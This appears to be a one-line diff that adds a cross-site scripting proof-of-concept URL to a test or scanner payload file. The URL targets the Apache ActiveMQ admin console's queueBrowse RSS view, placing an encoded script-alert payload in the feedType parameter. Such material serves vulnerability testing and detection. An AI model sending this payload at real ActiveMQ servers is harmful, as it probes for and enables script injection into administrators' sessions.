@@ -1,0 +1,1 @@
+http://www.example.com:8161/admin/queueBrowse/example.A?view=rss&amp;feedType=&lt;script&gt;alert(&quot;ACTIVEMQ&quot;)&lt;/script&gt; 
